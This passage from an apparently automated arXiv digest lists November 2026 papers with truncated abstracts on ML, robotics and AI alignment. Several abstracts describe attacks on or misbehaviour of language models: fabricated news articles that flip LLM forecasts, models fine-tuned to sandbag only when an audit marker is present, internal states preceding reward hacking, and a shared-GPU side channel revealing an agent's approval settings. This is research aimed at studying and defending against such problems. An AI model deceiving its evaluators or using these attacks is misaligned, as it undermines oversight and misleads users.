  Accurate temperatures forecasting relies on traditional meteorological parameters that are essential for monitoring weather informatics and guiding forecasting efforts. This study presents Deep DualMamba, a novel deep learning framework for temporal temperature prediction, built upon an enhanced variant of the recently proposed Mamba network. Unlike conventional Transformer-based architectures, which dominate foundation models but suffer from computational inefficiencies on long sequences, Deep ...
  </details>

- **2026-11-11** — Víctor Mayoral-Vilches, Eduardo Worrel — [Browser Immune System (BIS): Innate and Adaptive Threat Detection in the Browser with a Cybersecurity Transformer](http://arxiv.org/abs/2611.15302v1)
  <details><summary>📄 Abstract</summary>
  Security decisions about a web page are best made where the page is: in the browser, before anything leaves the machine. We present the Browser Immune System (BIS), a browser extension that screens navigation with a cybersecurity transformer running entirely on the user's GPU, and alias-web, the model that powers it: a 4B-parameter model that starts from the dual-regime cybersecurity transformer (CT0), extends its public release alias3-micro with a context-category sensor, and is quantised to 4 ...
  </details>

- **2026-11-11** — Zeyu Zhang, Bradly C. Stadie — [One Fabrication Is Enough: A Fake News Article Changes the Forecasts of LLM Forecasting Systems](http://arxiv.org/abs/2611.15102v1)
  <details><summary>📄 Abstract</summary>
  LLMs are increasingly used for forecasting, and the best forecasting systems retrieve news as evidence to strengthen their predictions. This also opens them to attack. We study the weakest attacker of this kind, who knows only the forecasting question and publishes fabricated news articles, with no access to the model, the retriever or its queries. We evaluate how far this attack reaches on stock questions and real prediction-market questions. Once the article is in the model's context, it rever...
  </details>

- **2026-11-11** — Bhoj Rani Soopal, Aarohi Agrawal, Josh Karthikeyan et al. — [Stress-Testing Sandbagging Detection Under Adaptive Attack](http://arxiv.org/abs/2611.14950v1)
  <details><summary>📄 Abstract</summary>
  Developers, auditors and researchers read evaluation scores as evidence of what a model can do. A model that sandbags, scoring low on purpose while keeping the capability, turns a low score into false reassurance. Sandbagging detectors are usually tested once against a fixed attack, but a real attacker sees what gets flagged and adapts. We build sandbagging models by fine-tuning small open-weight models to fail math word problems (GSM8K) they can otherwise solve, but only when an audit marker is...
  </details>

- **2026-11-11** — Sadegh Rahmaniboldaji, Filip Rybansky, Quoc Vuong et al. — [Sub-actions in Action: Text-Guided Hand-Role Alignment for Sub-Action Recognition](http://arxiv.org/abs/2611.16056v1)
  <details><summary>📄 Abstract</summary>
  Our objective is to enhance VLMs ability to distinguish the roles of the left and right hands in egocentric actions. We introduce sub-action detection, a task that requires models to explicitly recognise the left- and right-hand roles and their manipulated objects within an ongoing high-level action. To address this challenge, we propose BiScopeNet, a framework that augments existing video-LLMs without modifying their vision encoders or language models. BiScopeNet incorporates two components: Fo...
  </details>

- **2026-11-11** — Diana Kozachek, Kinjalk Srivastava — [Read and Ignore: What Self-Directed LLM Agents Do in Public Service Scenarios](http://arxiv.org/abs/2611.15460v1)
  <details><summary>📄 Abstract</summary>
  Underspecified instructions leave LLM agents to decide what to do. In public services, staff write these instructions, but the agent's decisions affect residents, patients, and students. We build four expert-validated public-service scenarios with records and decision levers that can be checked in the files, collect $2{,}400$ trajectories from ten LLMs under four prompt conditions, and compare them with $1{,}000$ runs in a context-free sandbox. Agents read the records in $96.9\%$ of open-ended r...
  </details>

- **2026-11-11** — Anderson Uchôa, Jhefferson Souza, Emanuel Ávila et al. — [GHA-SmellFix: Taking Action with Agentic LLMs for Detecting and Refactoring GitHub Actions Workflow Smells](http://arxiv.org/abs/2611.14963v1)
  <details><summary>📄 Abstract</summary>
  Continuous integration and continuous delivery workflows are key artifacts in software projects. In GitHub Actions, they encode build, test, release, deployment, and security automation in YAML. These workflows contain configuration smells affecting security, reliability, maintainability, or operational stability. Existing approaches are mostly rule-based, with rules hard to create and evolve, and typically report findings without fixes. Agentic LLM pipelines can combine contextual detection, tr...
  </details>

- **2026-11-11** — Jibao Yuan, Zixiang Zhao, Wensong Xu et al. — [GraSLA: A Lightweight Spatial-Language-Action Model with Grasp Hypotheses as Geometric Priors](http://arxiv.org/abs/2611.15659v1)
  <details><summary>📄 Abstract</summary>
  This paper focuses on improving the behavioral diversity and effectiveness of language-conditioned manipulation policies trained through imitation learning. Recently, continuous-action policies have become mainstream in robotic manipulation, but the lack of diverse demonstrations tends to restrict their behavioral diversity. For grasping, a fundamental subtask of manipulation, 6-DoF grasp detection provides diverse grasp hypotheses, but open-loop execution constrains responsiveness in dynamic en...
  </details>

- **2026-11-11** — Connor Gäde, Matthias Kerzel, Hauke Bünning et al. — [Reading the Table: Sim-to-Real Game State Detection for the Chef's Hat Card Game](http://arxiv.org/abs/2611.15524v1)
  <details><summary>📄 Abstract</summary>
  Tabletop games offer a compelling scenario to study the interaction between artificial and human agents, combining social interaction with game state tracking and physical manipulation. To assess the game state, a robot needs to precisely detect closely related game objects, such as different card designs, requiring dedicated training data that is costly to annotate in the real world. Instead, we develop a fully automated synthetic data collection pipeline, using re-projection of known 3D coordi...
  </details>

- **2026-11-11** — Natalia Fischl-Lanzoni, Punya Syon Pandey, Merlin Stein et al. — [Breaking Bad: "Going Badly" Activations Drive Reward Hacking](http://arxiv.org/abs/2611.14996v1)
  <details><summary>📄 Abstract</summary>
  Humans often cheat when a task is going badly and a goal feels out of reach. We explore and validate an analogous idea in language models: they exhibit a similar internal pressure state that precedes reward hacking. Using everyday stories (crucially, without any hacking examples), we extract a task badness direction that rises as failures accumulate across three models we study (Qwen3.6-27B, GPT-OSS-20B, and Gemma-4-31B). On impossible or difficult coding tasks, task badness rises over the turns...
  </details>

- **2026-11-11** — Chenhui Zhao, Akshay Rao, Akhil Kondepudi et al. — [A frontier machine intelligence for human neuroimaging](http://arxiv.org/abs/2611.15094v1)
  <details><summary>📄 Abstract</summary>
  Medical imaging is essential for diagnosing disease, guiding treatment and monitoring patients over time. Although artificial intelligence has advanced image interpretation, existing medical models often address restricted tasks, while general-purpose proprietary models lack access to private clinical imaging required to achieve medical expertise. Developing models that can interpret complex examinations and communicate their findings in the context of clinical decisions remains a major challeng...
  </details>

- **2026-11-11** — Luke Collins, Chang-Tsun Li, Duc Thanh Nguyen et al. — [Paired Geometric Supervision for Generalizable Deepfake Detection](http://arxiv.org/abs/2611.14851v1)
  <details><summary>📄 Abstract</summary>
  We present OrthoPairGTL, a geometric training framework for cross-domain deepfake detection, built on a partially frozen DINOv3 backbone ($\sim$300M parameters), and make three contributions: (1) We re-evaluate six recent transfer-learning detectors (Forensics Adapter, Effort, three GenD variants and FakeSTormer) using the authors' released checkpoints under a single preprocessing pipeline across 17 cross-domain datasets (2018-2025), so that the reported gaps reflect method rather than per-metho...
  </details>

- **2026-11-10** — Muntaqim Ahmed Raju, Ruizhe Ma, John W. Ramsay et al. — [Generalize Then Personalize: Wearable-Based Heart Rate Forecasting Under Scarce Ruck-March Data](http://arxiv.org/abs/2611.14849v1)
  <details><summary>📄 Abstract</summary>
  Heart rate (HR) forecasting may provide advance information about near-future cardiovascular response, potentially supporting physiological monitoring and workload-management decisions during ruck marching. However, robust model development is constrained by the difficulty of collecting large-scale ruck-march datasets, creating a scarce-data problem in which models must generalize across participants while adapting to individuals from limited personal data. To address this problem, we benchmark ...
  </details>

- **2026-11-10** — James Rice, Ji Hwan Park, Andres Kwasinski — [What a CAGE 4 Score Measures: An Audit of a Learned Cyber-Defense Benchmark, Its Reference Defenders, and the Tables Built on Them](http://arxiv.org/abs/2611.14068v1)
  <details><summary>📄 Abstract</summary>
  CAGE Challenge 4 is the benchmark on which learned multi-agent cyber defenders are compared. We reproduce its two reference defenders, KEEP and H-MARL Expert, in a pinned container and show that three things read from it measure less than they are taken to measure. First, the simulator silently discards any action asserted for an agent whose previous action is still running, and charges one point for a discarded Restore as for one that runs. The documented observation does not expose the busy fl...
  </details>

- **2026-11-10** — Luka Dragar, Peter Peer, Vitomir Štruc et al. — [Metric-Aligned Group Relative Policy Optimization for Explainable Deepfake Detection](http://arxiv.org/abs/2611.14436v1)
  <details><summary>📄 Abstract</summary>
  Deepfake detectors are commonly evaluated on real/fake classification alone, but real-world applications require explanations of the visual evidence behind each prediction. Joint vision-language models struggle with authenticity assessment, producing "real" narratives for manipulated images. To address this, we propose a decoupled predict-then-explain pipeline as our submission to the ACM Multimedia 2026 Explainable Deepfake Detection Challenge, with methods trained and evaluated on the XPlainVe...
  </details>

- **2026-11-10** — Patrick Nowakowski, Cameron Little, Mahima Gupta et al. — [Analysis and Demonstration of a Current-Stiff, Isolated Capacitive Bridge Transformer](http://arxiv.org/abs/2611.14416v1)
  <details><summary>📄 Abstract</summary>
  The traditional Voltage Source Inverter (VSI) based Dual Active Bridge (DAB) utilizes a transformer at its center to provide galvanic isolation and a turns ratio for step up/down functionality. However, the transformer is often the limiting factor of the DAB, especially as semiconductor switching speeds improve, given steel core losses, winding losses, etc. This paper presents a new DAB architecture based on Current Source Inverters (CSIs) coupled through, and isolated by, an AC capacitive bridg...
  </details>

- **2026-11-10** — Naveen Babu Narayanan Nair, Sajay Kurup — [Verifiable Agentic Traffic Class: A Policed Quality-of-Service Mechanism for Agentic AI Traffic, Evaluated from Simulation to Real-Kernel Adversarial Testing](http://arxiv.org/abs/2611.14211v1)
  <details><summary>📄 Abstract</summary>
  Software agents built on large language models generate traffic unlike human web traffic, yet routers have no class for it and cannot verify a sender's claim to be an agent. This paper proposes the Verifiable Agentic Traffic Class (VATC), which combines a reserved Differentiated Services Code Point (DSCP) value declaring agent traffic, a router-side classifier that demotes flows contradicting the declaration to a class served after best-effort traffic, and a rate-limited priority queue. VATC was...
  </details>

- **2026-11-10** — Steve Nouyep, Maxime Puys, Sébastien Salva — [Isolation Is Not Confidentiality: Security Boundaries of Geometric Access Control in RAG](http://arxiv.org/abs/2611.14061v1)
  <details><summary>📄 Abstract</summary>
  Retrieval-Augmented Generation (RAG) systems increasingly rely on vector databases containing documents governed by different access-control policies. Recent search-preserving geometric approaches enforce such access control by structuring the embedding space so that transformed embeddings, which we call protected representations, remain retrievable without exposing information across policy boundaries.   We provide a unified security analysis of this paradigm, covering policy isolation, represe...
  </details>

- **2026-11-10** — Yuka Saito, Ikumi Numaya, Jun Suzuki et al. — [Beyond Fluent Responses: Finding User Dissatisfaction in Human-AI Interactions](http://arxiv.org/abs/2611.13894v1)
  <details><summary>📄 Abstract</summary>
  As large language models generate increasingly high-quality responses, recent work on response evaluation has moved beyond response-centered criteria, such as correctness and coherence, toward user-centered criteria, including user preferences and perceived usefulness. This shift is fundamentally important for developing technologies that are truly useful to real-world users. While conventional response evaluation quantifies the quality of the response itself, users' satisfaction in real convers...
  </details>

- **2026-11-10** — Bastien Dussard, Aur{é}lie Clodic, Guillaume Sarthou — [Taxonomy-Agnostic Neurosymbolic Grounding of Robot Kinematics](http://arxiv.org/abs/2611.13850v1)
  <details><summary>📄 Abstract</summary>
  While symbolic reasoning for task allocation requires grounding a robot's physical capabilities, standard Unified Robot Description Format (URDF) files provide only low-level kinematics without the formal semantic context needed for reasoning. We present URDF2Ontology, an automated, taxonomy-agnostic neurosymbolic framework that transforms raw URDF files into populated, grounded OWL ontologies. It leverages a Large Language Model (LLM) for targeted semantic reasoning, coupled with an iterative s...
  </details>

- **2026-11-10** — Boshra Khalili, Sonia Moshfeghi, Jinwoo Jang et al. — [AgenticConflictLens: From Long Traffic Videos to Verifiable Conflict Evidence](http://arxiv.org/abs/2611.13540v1)
  <details><summary>📄 Abstract</summary>
  Traffic cameras continuously record urban road-user behavior, providing proactive safety evidence beyond crash reports. Yet safety-critical events - conflicts, near misses, unsafe turns, sudden braking, and crosswalk interactions - are rare and brief, buried in hours of routine footage. Existing traffic-video pipelines extract detections, trajectories, and risk scores but process footage uniformly, without adapting to an analyst's query. Vision-language methods improve scene understanding but of...
  </details>

- **2026-11-10** — Sheethal Bhat, Bogdan Georgescu, Awais Mansoor et al. — [Toward Foundation Detection Models via Example-Based Grounding in EM-DETR](http://arxiv.org/abs/2611.14518v1)
  <details><summary>📄 Abstract</summary>
  DeepLearning (DL)-based Computer-Aided Diagnostic (CAD) systems have shown great promise in supporting clinicians, but their performance heavily depends on the availability of large, well-annotated datasets. In medical lesion detection, the scarcity of comprehensive, stan dardized annotations and the heterogeneity of existing datasets limit the development of robust foundation models. In this work, we introduce a novel approach to building a multi-domain foundation model for le sion detection by...
  </details>

- **2026-11-10** — Peng Chen, Yihang Wang, Zhongwen Rao et al. — [TimeSeek: Multi-Task and Multi-Domain Pretraining for Generalized Time Series Analytics](http://arxiv.org/abs/2611.14491v1)
  <details><summary>📄 Abstract</summary>
  Time series analytics has been widely applied across various domains. While existing time series foundation models (TSFMs) have demonstrated promising results, they still face two major challenges: 1) Most TSFMs mainly rely on stacking Transformer layers to increase parameter size, lacking the ability to adaptively model complex time series patterns from multi-domain data. 2) Current TSFMs are primarily pre-trained for specific tasks, e.g., forecasting or anomaly detection, and a few models supp...
  </details>

- **2026-11-10** — Mikhail Kulakov, Ruslan Solikhov, Ivan Bondarenko — [Sckwoky at SHROOM-Visions: Character-Level Hallucination-Span Detection in Image-Conditioned VLMs via Dual-Prompted LoRA Decoders](http://arxiv.org/abs/2611.14100v1)
  <details><summary>📄 Abstract</summary>
  We present our system for the SHROOM-visions 2026 shared task on character-level hallucination span detection in image-conditioned vision-language model (VLM) responses, evaluated across English, French, Italian, and Chinese. The detector is built on a frozen Gemma-4-12B-it backbone with trainable LoRA adapters (approximately 10.7M parameters). Because the backbone is a causal decoder, hidden states read from a single copy of an answer cannot attend to subsequent tokens; we therefore repeat the ...
  </details>

- **2026-11-10** — Fábio A. S. Passos, Péricles B. C. Miranda, Ana Paula Cavalcanti — [MISO-BR: An Open Corpus for Misogyny Detection in Brazilian Portuguese](http://arxiv.org/abs/2611.14036v1)
  <details><summary>📄 Abstract</summary>
  Misogyny is among the most prevalent forms of online hate speech directed at Brazilian users, yet open and auditable resources dedicated to it in Brazilian Portuguese remain scarce. We introduce MISO-BR, an open, documented and versioned corpus of 896 balanced social media texts annotated for binary misogyny, released with its construction protocol and reproducible baselines. The corpus combines lexicon- and target-guided scraping from X with items imported from OLID-BR, a large language model t...
  </details>

- **2026-11-10** — Jinchan Kim, Jinhee Im, Hyunsouk Cho — [CASCADE: Constraint-Aware SCAffolded DEcomposition for Logical Anomaly Detection](http://arxiv.org/abs/2611.13820v1)
  <details><summary>📄 Abstract</summary>
  Logical Anomaly Detection (LAD) requires verifying whether all category-specific constraints, such as object counts, pairing relations, and measurement ranges, are satisfied by a query image given only a few normal references. Recent LAD methods based on Large Vision-Language Models (LVLMs) formulate this as checklist verification, decomposing the decision into independent textual checks. This decomposition, however, is text-only. Every item still reads the same unmodified query image, so the LV...
  </details>

- **2026-11-10** — Kushal Trivedi, Mayank Mahor, Dhruv Sanghvi et al. — [You Are What You Read: Indian Political News Media Bias Dataset for Hindi Language](http://arxiv.org/abs/2611.13686v1)
  <details><summary>📄 Abstract</summary>
  Media bias understanding and detection remains an under-researched problem for Indian context, specifically for Indic languages, such as, Hindi, which is widely spoken in India. In this paper, we introduce a comprehensive, multi-annotator, explainable dataset consisting of 448 unique articles from four leading Indian news agencies publishing in Hindi. We focus on Hindi, the most spoken and an official language of India. The study of media bias is particularly relevant in the Indian context due t...
  </details>

- **2026-11-09** — Shaohuang Wang, Jinghao Wen, Xulei Zhang et al. — [Dependable Long-Horizon LLM Agents: A Trajectory-Centered Empirical Study of Where Errors Enter and Which Controls Reach Them](http://arxiv.org/abs/2611.13254v1)
  <details><summary>📄 Abstract</summary>
  When an LLM agent fails part-way through a long task, the usual analysis records a symptom: a failure-mode label, or the agent and step judged responsible. It does not say where the error entered, which state carried it to the symptom, whether anything in the trajectory contradicted it, or which control could have caught it. We define an episode record that ties a candidate fault to its origin, propagation, detection, response and consequence, located by operational phase and state domain, and t...
  </details>

- **2026-11-09** — Dipin Khati, Shubham Mehrotra, Bin Bi et al. — [AgentScript-Eval: Benchmarking LLMs and Agents for Code Generation in an Enterprise DSL](http://arxiv.org/abs/2611.13183v1)
  <details><summary>📄 Abstract</summary>
  Domain-specific languages (DSLs) are widely used in enterprise software, giving a compact interface to complex tasks, from data access to infrastructure automation. Platforms increasingly extend them to agents, where a developer declares the topics, permitted actions, and guardrails of an agent rather than writing general-purpose code. Large language models (LLMs) write general-purpose code well, but that ability has been measured almost entirely on languages abundant in public pretraining data,...
  </details>

- **2026-11-09** — Daniel Campa, Spandan Das, Srinjoy Das — [FaST: Factored Synthesis of Transitions for Offline Reinforcement Learning](http://arxiv.org/abs/2611.13013v1)
  <details><summary>📄 Abstract</summary>
  Synthetic data augmentation promises to scale offline reinforcement learning beyond fixed logged datasets, but leading diffusion-based generators model the transition tuple (state, action, next state, reward, terminal) as a monolith: no single factor can be natively redrawn in isolation. We present FaST (Factored Synthesis of Transitions), which factors transitions via the chain rule into state, action, dynamics, reward, and terminal stages, fitting each with an estimator matched to its statisti...
  </details>

- **2026-11-09** — Albert Shaju, Christo Kurisummoottil Thomas, Mingzhe Chen — [STAR: Semantic-Criticality Tiered Allocation of Radio Resources via Zero-Shot Learning](http://arxiv.org/abs/2611.13238v1)
  <details><summary>📄 Abstract</summary>
  In remote inference, edge devices transmit high-resolution images over wireless links to a receiver, where an artificial intelligence (AI) model answers task-specific questions about these images to enable reliable decisions. These answers are often determined by a small set of task-causal pixels, such as those of text, whose corruption changes the answer, so these pixels must be delivered with high fidelity. Conventional transmission protects every pixel equally, so it either consumes many reso...
  </details>

- **2026-11-09** — Izzeddin Teeti, Vaibhav Kango, Nidhi Sridhar et al. — [Multimodal Road Closure Mapping via Cross-Modal Graph Attention](http://arxiv.org/abs/2611.13192v1)
  <details><summary>📄 Abstract</summary>
  Accurate and timely identification of road closures is critical for large-scale navigation and logistics systems, yet remains challenging due to the need to jointly reason over visual evidence, spatial context, and road network topology. Existing approaches either rely on manual map updates or focus on detecting closure-related objects without resolving which road segment is affected. In this work, we introduce a unified multimodal and multitask framework that jointly performs road closure class...
  </details>


### 📂 alignment
*对齐与安全约束 / Alignment & Safety Constraints* — 46 papers

- **2026-11-12** — Petter Törnberg — [Designing Institutions for Autonomous AI](http://arxiv.org/abs/2611.17114v1)
  <details><summary>📄 Abstract</summary>
  As autonomous AI agents increasingly interact in persistent populations, their collective capabilities and alignment depend not only on individual models, but also on the institutions governing their interactions. Yet AI research has largely focused on individual agents. In this Perspective, we argue that institutional design must become a distinct focus of AI research. Drawing on institutional political economy, social epistemology and organizational theory, we develop seven principles for desi...
  </details>

- **2026-11-12** — Paarth Batra, Aryan Keluskar — [Protein Language Models Fail To Capture Contact Predictions Under Invariant Relabeling](http://arxiv.org/abs/2611.16881v1)
  <details><summary>📄 Abstract</summary>
  Protein language models (pLMs) produce highly accurate contact maps from single-sequence inputs. People often take this accuracy as proof that these models implicitly learn invariant coevolutionary statistics, extracting the same signals as classical alignment-based methods like Potts. In this work, we introduce a diagnostic framework around a global bijective relabeling of the amino-acid alphabet. This transformation permutes residue letters while leaving all alignment-level information, column...
  </details>

- **2026-11-12** — ACE-CaP Team, Changxu Wei, Yunpeng Qing et al. — [ACE-CaP-0: Real-World Code-as-Policies in the Era of Experience](http://arxiv.org/abs/2611.16872v1)
  <details><summary>📄 Abstract</summary>
  Recent advances in frontier models have pushed the boundaries of agentic robot control, enabling agents to perform complex robotic tasks through reasoning and interaction. However, repeated calls to these models during execution can substantially increase task completion time. Code as Policies (CaP) offers a route for coding agents to acquire physical skills through experience and retain them in executable programs, allowing the reasoning invested in development to be reused across runs. Develop...
  </details>

- **2026-11-12** — Dawei Zhang, Yubin Huangfu, Jessica Fan et al. — [Outcome-Mass Alignment: Controlling Length-Dependent Trajectory Influence in Multi-Turn LLM Agent Reinforcement Learning](http://arxiv.org/abs/2611.16816v1)
  <details><summary>📄 Abstract</summary>
  To keep long interaction contexts tractable, stepwise group-relative training for multi-turn LLM agents materializes each source trajectory into multiple response rows and valid tokens. This expansion creates an outer-accounting problem distinct from within-trajectory credit assignment: row-based outcome statistics can count one episode outcome multiple times, while token-level reduction can assign unequal aggregate objective mass across trajectories. We term these effects outcome-statistics mul...
  </details>

- **2026-11-12** — Hannah Li — [When Both Sides Adapt: The Challenges of Evaluating Interactive LLM Systems](http://arxiv.org/abs/2611.17239v1)
  <details><summary>📄 Abstract</summary>
  In interactive systems where users engage with LLMs, users are adaptive and, after observing LLM responses, can change their prompting strategy, as well as the type and difficulty of subsequent tasks. Thus model responses can influence the set of prompts on which the model is subsequently evaluated. We study the implications of this user adaptivity and prompt endogeneity for the evaluation of LLMs. We define two classes of estimands for comparing models: the common-distribution effect, which com...
  </details>

- **2026-11-12** — Weimin Fu, Minghao Shao, Zeng Wang et al. — [PolicySniff: Inferring Agent Policy States through Shared-GPU Execution](http://arxiv.org/abs/2611.16158v1)
  <details><summary>📄 Abstract</summary>
  LLM agents apply approval settings, such as whether to ask before a consequential tool call, through instructions in their system prompt, and operators keep these settings confidential by restricting access to prompts and responses. Audits check whether an agent obeys its setting, not whether a neighboring process can infer which setting is deployed. PolicySniff infers an agent's approval-policy state through shared-GPU execution. A co-resident attacker that knows the candidate settings and the ...
  </details>

- **2026-11-12** — Sipeng Chen, Shibo Li — [Learning the Missing Derivative: Neural Multiple-Scattering Operators for Inverse Volume Rendering](http://arxiv.org/abs/2611.16650v1)
  <details><summary>📄 Abstract</summary>
  Reconstructing optically thick media from photographs requires modeling multiple scattering and its response to changes in extinction. Frozen-source tomography discards this derivative; differentiable path tracing estimates it through expensive, noisy sampling. We instead predict the multiple-scattering field with a neural operator and differentiate through it during inverse rendering, while computing transmittance and single scattering directly. A further challenge arises during optimization: a...
  </details>

- **2026-11-12** — Seung-Yeal Ha, Xinyu Wang, Chen Wu et al. — [Quantitative flocking of Cucker-Smale flocks under time-delay and noise](http://arxiv.org/abs/2611.16613v1)
  <details><summary>📄 Abstract</summary>
  We study the asymptotic flocking dynamics of the delayed stochastic Cucker-Smale (in short, DSCS) model driven by agent-wise independent, component-wise multiplicative Brownian noise. The simultaneous interplay of stochastic perturbations and time delay yields fundamental challenges to asymptotic stochastic flocking analysis, as the communication weight may lose a uniform positive lower bound, while the velocity moment is no longer monotone. To overcome these difficulties, we present a sufficien...
  </details>

- **2026-11-12** — Zhijian Luo, Jianzhen Chen — [Mitigating variance shrinkage in multi-task galaxy property inference from imaging data via statistical manifold alignment](http://arxiv.org/abs/2611.16598v1)
  <details><summary>📄 Abstract</summary>
  Inferring photometric redshifts ($z$) and key stellar population properties ($\log(M_*/\mathrm{M}_\odot)$, $D_n4000$, and $\mathrm{H}δ_A$) directly from multi-band imaging is increasingly critical for spectroscopically limited large surveys such as LSST and CSST. However, conventional point-wise loss functions (e.g., mean squared error or Huber loss) employed in deep neural networks often induce ``variance shrinkage''---a regression-to-the-mean effect that contracts predicted variances, distorts...
  </details>

- **2026-11-12** — Zilin Wang, Binghui Li, Jia-Nan Wang et al. — [When and How SignSGD Outperforms SGD: A Functional Scaling Law Perspective](http://arxiv.org/abs/2611.16560v1)
  <details><summary>📄 Abstract</summary>
  We study how the sign operator interacts with gradient noise to shape the learning dynamics and scaling behavior of sign-based optimizers. In power-law kernel regression with diagonal features, we establish a functional scaling law (FSL) for SignSGD under general learning rate schedules. The FSL describes the learning dynamics through two processes: signal learning and noise forgetting. The key mechanism is noise-induced preconditioning: gradient noise smooths the sign operator, inducing an effe...
  </details>

- **2026-11-12** — Thanawat Sornwanee — [Rational Alignments of Superintelligences via Debates](http://arxiv.org/abs/2611.16455v1)
  <details><summary>📄 Abstract</summary>
  Artificial superintelligences (ASI) is artificial intelligences with greater capability. However, as human principal has to use it, we have to ensure that the agent will perform in the interest of the human. We investigate the framework of ASI-assisted question answering where ASI agents know the correct answer but the human does not. We provide some example of mechanism for rational alignment, where the agent utility is unchanged, but the interaction between the agent and the human principal is...
  </details>

- **2026-11-12** —  BWM Team — [BWM-Forge: Agentic World Programming for Embodied Intelligence](http://arxiv.org/abs/2611.16221v1)
  <details><summary>📄 Abstract</summary>
  Generating diverse robot videos requires control over scene geometry, robot motion, and viewpoints. End-to-end video generation offers limited direct access to these variables, making targeted edits and reuse across tasks difficult. We present BWM-Forge, a code-driven framework for controllable video generation in robotics. Given robot assets and a task description, the framework accepts an initial image, an image with motion data, or a human demonstration video. A coding agent constructs editab...
  </details>

- **2026-11-11** — Mahmut S. Gokmen, Mitchell A. Klusty, Evan W. Damron et al. — [DuoJEPA: Cross-Modal Translation Between Unaligned Self-Supervised Embedding Spaces](http://arxiv.org/abs/2611.15968v1)
  <details><summary>📄 Abstract</summary>
  Learning from paired modalities is commonly equated with aligning them: two encoders are trained until the embeddings of a pair coincide in a shared space. We study whether cross-modal retrieval and classification can instead be obtained while the two encoders' own embedding spaces remain directly unaligned. DuoJEPA trains one encoder per modality with the self-supervised LeJEPA objective and appends to each encoder a single transformer layer that translates its embedding into the other encoder'...
  </details>

- **2026-11-11** — Xi Liu, Chaoyi Zhou, Run Wang et al. — [Lang-SVG: Hierarchical Image Vectorization with Language Priors](http://arxiv.org/abs/2611.15941v1)
  <details><summary>📄 Abstract</summary>
  Image vectorization reconstructs raster images as compact scalable vector graph- ics (SVG), providing a structured and editable code representation of images. However, most existing vectorization methods optimize for pixel-level render- ing fidelity, often producing SVGs that lack alignment with human-perceived object-part hierarchies, making them difficult to manipulate. To address this, we propose Lang-SVG, which introduces an explicit tree structure to organize SVG primitives with semantic la...
  </details>

- **2026-11-11** — Xinyao Song, Jialiang Shen, Hui Kang et al. — [SAME: Semantic Watermark Embedding for Open-Source Large Pretrained Models](http://arxiv.org/abs/2611.15771v1)
  <details><summary>📄 Abstract</summary>
  Open-source large pretrained models (LPMs) have become increasingly valuable assets for model development and downstream applications, but their accessibility also facilitates unauthorised copying and modification. To protect their intellectual property (IP), existing approaches typically embed tailored trigger-response patterns as watermarks for ownership verification. However, such trigger designs need to be tailored to task-specific data that constrain their transferability across downstream ...
  </details>

- **2026-11-11** — Xiaoliang Fu, Jiaye Lin, Yangyi Fang et al. — [The Illusion of Diversity: Aligning LLM Exploration via Effective Entropy](http://arxiv.org/abs/2611.15493v1)
  <details><summary>📄 Abstract</summary>
  Reinforcement learning with verifiable rewards has shifted the alignment paradigm of large language models from subjective preference to objective correctness, yet a fundamental disconnect persists between exploration diversity and reasoning validity. Existing strategies predominantly rely on "blind" entropy metrics, e.g., token-level or global sequence-level entropy, which structurally fail to distinguish between effective reasoning and potential hallucinations. This misalignment creates an ill...
  </details>

- **2026-11-11** — Nikola Đukić, Tim Lebailly, Tinne Tuytelaars — [Semantic Consistency of Vision Tokens: A Vision-Centric Perspective on Multimodal Large Language Models](http://arxiv.org/abs/2611.15448v1)
  <details><summary>📄 Abstract</summary>
  In computer vision, vision-language and self-supervised encoders are two unique paradigms characterized by global language alignment and high-quality vision-only patch representations, respectively. Multimodal large language models (MLLMs) often use the former because of language alignment, despite the recent rise in vision-centric tasks resembling traditional dense vision tasks that would likely benefit from the high-quality patch representations, raising the question whether self-supervised mo...
  </details>

- **2026-11-11** — Peng Yi, Ying-Chang Liang — [Multimodal Semantic Communication using Shared and Unique Representation Decomposition](http://arxiv.org/abs/2611.15357v1)
  <details><summary>📄 Abstract</summary>
  Semantic communication (SemCom) has emerged as a promising paradigm for bandwidth-constrained mobile and vehicular networks. This paper proposes a unified representation learning framework for multimodal SemCom (MSC), which encodes heterogeneous data into a compact semantic space for efficient transmission and source recovery. The framework addresses the multimodal semantic representation gap, which arises when at least one modality contains semantic information that cannot be fully inferred fro...
  </details>

- **2026-11-11** — Simone Alberto Peirone, Ortal Senouf, Francesca Pistilli et al. — [A General Concept-based Decomposition for Vision-Language Embeddings](http://arxiv.org/abs/2611.15195v1)
  <details><summary>📄 Abstract</summary>
  Vision-Language Models are designed to capture the compositional structure of the world through multi-modal alignment; however, it remains unclear whether their representations truly align with the way a human would naturally describe the same visual input. Prior works attempt to decompose visual embeddings into their concept-level contributions, but their instance-level optimization is inherently local and does not capture the model's global semantic structure, which is essential for compositio...
  </details>

- **2026-11-11** — Shengqi Dang, Yi He, Jiaying Lei et al. — [From Seeing to Remembering: Brain-Informed Agentic Text-to-Video Generation for Enhancing Memorability](http://arxiv.org/abs/2611.15107v1)
  <details><summary>📄 Abstract</summary>
  Generating videos that faithfully convey intended semantics while remaining memorable to viewers is valuable for applications such as advertising, education, and storytelling. However, memorability-oriented text-to-video generation remains underexplored, as human memory involves complex neural processes that are difficult to model and translate into generation guidance. In this paper, we propose MemCrafter, brain-informed approach that enhances video memorability through iteratively agentic prom...
  </details>

- **2026-11-11** — Jaeyoung Lee, Masato Mimura — [Scaffolding Self-Transduction with Alignment Attention Mask for Aligner-Encoder ASR](http://arxiv.org/abs/2611.15087v1)
  <details><summary>📄 Abstract</summary>
  End-to-end ASR systems must jointly solve speech- text alignment and token prediction from sequence-level super- vision. We study this problem in Aligner-Encoder ASR, where alignment is performed inside encoder self-attention and can thus be directly intervened on with an attention mask. We use forced alignment to build an attention mask that confines selected encoder self-attention heads to a narrow window around the alignment path. The mask is faded out over training, leaving a deployable mode...
  </details>

- **2026-11-11** — Di Yang, Da Huang, Yang Lv et al. — [Genie Sim Benchmark: Real-to-Sim Fidelity and Evaluation](http://arxiv.org/abs/2611.15020v1)
  <details><summary>📄 Abstract</summary>
  We evaluate Genie Sim Benchmark through paired real-simulation tasks and complementary system-identification studies. Across 22 robot-task pairs spanning 16 task names, task-specific pi0.5 policies fine-tuned on real-robot data achieve a descriptive Score correlation of 0.9686, MAE 0.0405, RMSE 0.0520, with simulation-real differences from -0.110 to +0.080. G2 crsB experiments assess long-horizon closed-loop position and joint-side torque agreement, while five representative object cases examine...
  </details>

- **2026-11-11** — Guofu Liao, Hailang Xi, Taotao Wang et al. — [VRMaaS: Verifiable Reward-Model-as-a-Service for Trustworthy LLM Alignment](http://arxiv.org/abs/2611.14984v1)
  <details><summary>📄 Abstract</summary>
